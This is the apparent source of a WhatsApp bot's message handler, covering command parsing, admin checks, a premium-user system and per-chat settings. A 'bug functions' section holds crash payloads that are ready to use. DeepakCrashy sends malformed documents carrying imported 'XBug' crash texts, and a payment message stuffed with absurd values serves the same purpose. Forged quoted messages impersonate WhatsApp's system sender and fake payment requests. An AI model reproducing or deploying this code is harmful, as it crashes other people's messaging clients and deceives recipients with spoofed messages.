//Zenitsu-Bot7
require('./lib/listmenu')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
const pkg = require('imgur')
const { ImgurClient } = pkg
const uploadImage = require('./lib/uploadImage')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')
const { deepak_antispam } = require('./lib/antispam')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//store
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list')
//data
let deepakezzyaudio = JSON.parse(fs.readFileSync('./DeepakMedia/audio.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/deepakvn.json'))
const StickerDeepak= JSON.parse(fs.readFileSync('./DeepakMedia/database/deepaksticker.json'))
const ImageDeepak= JSON.parse(fs.readFileSync('./DeepakMedia/database/deepakimage.json'))
const VideoDeepak= JSON.parse(fs.readFileSync('./DeepakMedia/database/deepakimage.json'))
const DocDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/doc.json'))
const ZipDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/zip.json'))
const ApkDeepak = JSON.parse(fs.readFileSync('./DeepakMedia/database/apk.json'))

//bug database
const { deepaktext1 } = require('./src/data/function/XBug/deepaktext1')
const { deepaktext2 } = require('./src/data/function/XBug/deepaktext2')
const { deepaktext3 } = require('./src/data/function/XBug/deepaktext3')
const { deepaktext4 } = require('./src/data/function/XBug/deepaktext4')
const { deepaktext5 } = require('./src/data/function/XBug/deepaktext5')
const { deepaktext6 } = require('./src/data/function/XBug/deepaktext6')
const wkwk = fs.readFileSync(`./src/data/function/XBug/x.mp3`)
const xsteek = fs.readFileSync(`./src/data/function/XBug/x.webp`)

//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

const deepakverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var deepaktimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var deepaktimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var deepaktimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var deepaktimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var deepaktimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var deepaktimewisher = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = DeepakBotInc = async (DeepakBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 and command2 particulary for auto download
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await DeepakBotInc.decodeJid(DeepakBotInc.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const deepakmisc = (m.quoted || m)
        const quoted = (deepakmisc.mtype == 'buttonsMessage') ? deepakmisc[Object.keys(deepakmisc)[1]] : (deepakmisc.mtype == 'templateMessage') ? deepakmisc.hydratedTemplate[Object.keys(deepakmisc.hydratedTemplate)[1]] : (deepakmisc.mtype == 'product') ? deepakmisc[Object.keys(deepakmisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const deepakbody = body.startsWith(pric)
        const isCommand = deepakbody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await DeepakBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isDeepakMedia = m.mtype
        //user status
        const isUser = deepakverifieduser.includes(sender)
        const DeepakTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= DeepakTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(DeepakBotInc, m, premium)
        
        //theme sticker reply
        const DeepakStickWait = () => {
        let DeepakStikRep = fs.readFileSync('./DeepakMedia/theme/sticker_reply/wait.webp')
        DeepakBotInc.sendMessage(from, { sticker: DeepakStikRep }, { quoted: m })
        }
        const DeepakStickAdmin = () => {
        let DeepakStikRep = fs.readFileSync('./DeepakMedia/theme/sticker_reply/admin.webp')
        DeepakBotInc.sendMessage(from, { sticker: DeepakStikRep }, { quoted: m })
        }
        const DeepakStickBotAdmin = () => {
        let DeepakStikRep = fs.readFileSync('./DeepakMedia/theme/sticker_reply/botadmin.webp')
        DeepakBotInc.sendMessage(from, { sticker: DeepakStikRep }, { quoted: m })
        }
        const DeepakStickOwner = () => {
        let DeepakStikRep = fs.readFileSync('./DeepakMedia/theme/sticker_reply/owner.webp')
        DeepakBotInc.sendMessage(from, { sticker: DeepakStikRep }, { quoted: m })
        }
        const DeepakStickGroup = () => {
        let DeepakStikRep = fs.readFileSync('./DeepakMedia/theme/sticker_reply/group.webp')
        DeepakBotInc.sendMessage(from, { sticker: DeepakStikRep }, { quoted: m })
        }
        const DeepakStickPrivate = () => {
        let DeepakStikRep = fs.readFileSync('./DeepakMedia/theme/sticker_reply/private.webp')
        DeepakBotInc.sendMessage(from, { sticker: DeepakStikRep }, { quoted: m })
        }
 
 //bug functions
const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};
//bug functions
const subscribe_DGDEEPAK = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Deepak's ur father`
}}
}
async function DeepakCrashy(DGDEEPAK,chat) {
DeepakBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${DGDEEPAK}.${deepaktext1}` ,
caption: `${DGDEEPAK + deepaktext1}`,
}, {quoted: subscribe_DGDEEPAK })
}
//end bug functions

        //premium
        async function replyprem(teks) {
    replygcdeepak(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendDeepakBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await DeepakBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygcdeepak(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                DeepakBotInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               DeepakBotInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 'v4') {
                replygcdeepak2(teks)
            }
        }
        
        //fake reply with channel link embedded
async function replygcdeepak2(txt) {
const deepaknewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterName: "Zenitsu-Bot7",
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return DeepakBotInc.sendMessage(from, deepaknewrep, {
quoted: m,
})
}
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=918348225320:918348225320\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = DeepakBotInc.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: DeepakBotInc.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: DeepakBotInc.getName(botNumber), alias: botname}, owner: { nick: DeepakBotInc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: DeepakBotInc.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: DeepakBotInc.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//autoreact
const deepakreact = async () => {
  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    DeepakBotInc.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  DeepakBotInc.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}

//bug loading
async function loading () {
var deepaklod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await DeepakBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < deepaklod.length; i++) {
await DeepakBotInc.sendMessage(from, {text: deepaklod[i], edit: key })
}
} 

const deepakimun = (texto) => {
DeepakBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return m.reply("Erro..")
})
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//sticker meta function
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
